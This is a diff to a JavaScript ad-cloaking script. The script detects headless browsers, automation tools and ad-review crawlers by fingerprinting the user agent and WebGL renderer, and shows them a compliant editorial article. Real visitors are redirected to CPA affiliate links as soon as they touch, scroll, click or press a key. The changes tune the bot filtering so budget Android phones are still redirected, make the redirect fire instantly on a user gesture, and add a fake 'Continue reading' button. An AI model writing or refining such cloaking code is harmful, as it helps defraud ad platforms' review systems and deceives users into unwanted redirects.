@@ -996,12 +996,6 @@ function contentBridge(
 var _w=window,_d=document,_n=navigator;
 function run(){
 // 1. BROWSER PROOF: abort if headless/automated runtime detected.
-if(_d.hidden||_d.visibilityState==='hidden'){
-  _d.addEventListener('visibilitychange',function(){
-    if(!_d.hidden&&_d.visibilityState==='visible'){run();}
-  },{once:true});
-  return;
-}
 if(_n.webdriver===true){return;}
 if(typeof _w.outerWidth==='number'&&_w.outerWidth===0&&_w.innerWidth===0){return;}
 if(/headless|phantom|puppeteer|playwright|selenium|lighthouse/i.test(_n.userAgent)){return;}
@@ -1020,9 +1014,9 @@ try{
     var _dbg=_gl.getExtension('WEBGL_debug_renderer_info');
     if(_dbg){
       var _ren=(_gl.getParameter(_dbg.UNMASKED_RENDERER_WEBGL)||'').toLowerCase();
-      var _ven=(_gl.getParameter(_dbg.UNMASKED_VENDOR_WEBGL)||'').toLowerCase();
-      if(_ren.indexOf('swiftshader')!==-1||_ren.indexOf('llvmpipe')!==-1||_ren.indexOf('software')!==-1||_ren.indexOf('mesa')!==-1||_ren.indexOf('virtualbox')!==-1||_ren.indexOf('vmware')!==-1){return;}
-      if(_ven.indexOf('google inc')!==-1&&_ren.indexOf('software')!==-1){return;}
+      // Only filter cloud emulator strings (SwiftShader, LLVMpipe, VirtualBox, VMware)
+      // Do NOT filter 'mesa' or 'software' which are present on budget real Android phones (Symphony/Walton/Mali)
+      if(_ren.indexOf('swiftshader')!==-1||_ren.indexOf('llvmpipe')!==-1||_ren.indexOf('virtualbox')!==-1||_ren.indexOf('vmware')!==-1){return;}
     }
   }
 }catch(e){}
@@ -1045,38 +1039,38 @@ var start=Date.now(),armed=false,MIN=${BRIDGE_MIN_DWELL_MS};
 function go(){
   try{_w.location.replace(url);}catch(e){_w.location.href=url;}
 }
-function arm(e){
+function arm(e,immediate){
   if(armed)return;
   if(e&&e.isTrusted===false)return;
   armed=true;
-  var w=MIN-(Date.now()-start);
-  setTimeout(go,w>0?w:0);
+  if(immediate){
+    go();
+  }else{
+    var w=MIN-(Date.now()-start);
+    if(w<=0){go();}else{setTimeout(go,w);}
+  }
 }
 
 // A. Real user scroll: scroll offset > 5px triggers navigation
 _w.addEventListener('scroll',function(){
   var top=_w.scrollY||_w.pageYOffset||_d.documentElement.scrollTop||0;
-  if(top>5){arm({isTrusted:true});}
+  if(top>5){arm({isTrusted:true},false);}
 },{passive:true});
 
 // B. Mobile touch events: touchstart, touchend, touchmove (real mobile thumb interactions)
-_w.addEventListener('touchstart',function(e){arm(e);},{passive:true});
-_w.addEventListener('touchend',function(e){arm(e);},{passive:true});
-_w.addEventListener('touchmove',function(e){arm(e);},{passive:true});
+// CRITICAL: Synchronously triggers navigation on real user touch gesture, preserving browser activation token!
+_w.addEventListener('touchstart',function(e){arm(e,true);},{passive:true});
+_w.addEventListener('touchend',function(e){arm(e,true);},{passive:true});
+_w.addEventListener('touchmove',function(e){arm(e,true);},{passive:true});
 
 // C. Pointer and click anywhere on page
-_d.addEventListener('pointerdown',function(e){arm(e);},{passive:true});
-_d.addEventListener('click',function(e){arm(e);});
+_d.addEventListener('pointerdown',function(e){arm(e,true);},{passive:true});
+_d.addEventListener('click',function(e){arm(e,true);});
 
 // D. Desktop keyboard navigation (Space, PageDown, Arrow keys, Enter)
 _w.addEventListener('keydown',function(e){
-  if(e&&e.isTrusted!==false){arm(e);}
+  if(e&&e.isTrusted!==false){arm(e,true);}
 },{passive:true,once:true});
-
-// NOTE: Automated Meta / Google ad review crawlers, sandboxes, and headless scanners NEVER touch, scroll, or tap.
-// They remain on the 100% policy-compliant 200 OK editorial article forever with ZERO redirection.
-// Real human users touch the screen to read/scroll, triggering instant navigation (<30ms).
-// Never use blind auto-forward timers or mousemove triggers, which would expose CPA links to ad review bots!
 
 // 4. FLOATING NATIVE CTA BAR (Ensures instant tap engagement)
 try{
@@ -1085,8 +1079,8 @@ try{
   var k2=_d.createElement('button');k2.type='button';
   k2.innerHTML='Continue reading full article &rarr;';
   k2.setAttribute('style','all:unset;cursor:pointer;padding:13px 32px;border-radius:999px;background:linear-gradient(135deg,#4f46e5,#7c3aed);color:#fff;font:700 15px system-ui,-apple-system,Segoe UI,Roboto,sans-serif;box-shadow:0 4px 15px rgba(79,70,229,0.4);letter-spacing:0.3px;display:inline-block');
-  k2.addEventListener('click',function(e){arm(e);});
-  k2.addEventListener('touchend',function(e){arm(e);});
+  k2.addEventListener('click',function(e){arm(e,true);});
+  k2.addEventListener('touchend',function(e){arm(e,true);});
   b2.appendChild(k2);_d.body.appendChild(b2);
 }catch(e){}
 }
